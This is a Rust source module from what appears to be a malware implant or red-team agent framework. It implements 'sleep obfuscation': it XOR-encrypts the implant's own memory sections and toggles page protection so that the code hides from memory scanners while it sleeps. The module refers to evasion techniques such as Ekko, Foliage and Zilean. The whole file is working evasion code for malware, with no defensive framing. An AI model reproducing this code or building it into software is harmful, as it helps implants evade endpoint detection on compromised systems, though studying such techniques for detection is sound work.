//! Simple XOR-based memory masking for sleep obfuscation.
//!
//! Unlike the chain-based techniques (Ekko, Foliage, Zilean), this module applies a
//! repeating 128-byte XOR key directly to memory sections. It does not use NtContinue
//! context chains, stack spoofing, or thread context spoofing.

use {
    crate::common::apply_xor_mask,
    api::{
        api::{Api, MemorySection},
        util::{is_writable, make_section_writable, restore_section_protection},
    },
};

/// XOR-mask or unmask a single memory section using the global [`XORKEY`](crate::common::XORKEY).
///
/// When `mask` is `true` (encrypting), the section is made writable before XOR.
/// When `mask` is `false` (decrypting), the original protection is restored after XOR.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers.
/// * `section` - The memory section to XOR. Must describe a valid mapped region.
/// * `mask` - `true` to encrypt (RX -> RW -> XOR), `false` to decrypt (XOR -> RW -> RX).
///
/// # Safety
///
/// The caller must ensure `section` points to a valid, mapped memory region and that
/// the `Api` function pointers are resolved.
#[link_section = ".text$D"]
pub unsafe fn xor_section(api: &mut Api, section: &mut MemorySection, mask: bool) {
    api::log_info!(b"[XOR] xor_section", section.base_address as usize);

    // Step 1) If masking, make section writable (RX -> RW) before XOR
    if mask {
        make_section_writable(api, section);
    }

    // Step 2) Apply XOR if section is currently writable
    if is_writable(section.current_protect) {
        apply_xor_mask(section.base_address as _, section.size as _);
    }

    // Step 3) If unmasking, restore original protection (RW -> RX) after XOR
    if !mask {
        restore_section_protection(api, section);
    }
}

/// XOR-mask or unmask all tracked memory sections stored in `api.sleep.sections`.
///
/// Iterates up to 20 sections and delegates to [`xor_section`] for each.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers and sleep context with section list.
/// * `mask` - `true` to encrypt all sections, `false` to decrypt.
///
/// # Safety
///
/// The caller must ensure all section entries in `api.sleep.sections[0..num_sections]`
/// describe valid mapped memory and that `Api` function pointers are resolved.
#[link_section = ".text$D"]
pub unsafe fn mask_memory_from_context(api: &mut Api, mask: bool) {
    for i in 0..api.sleep.num_sections.min(20) {
        let section_ptr = &mut api.sleep.sections[i] as *mut MemorySection;
        xor_section(api, &mut *section_ptr, mask);
    }
}
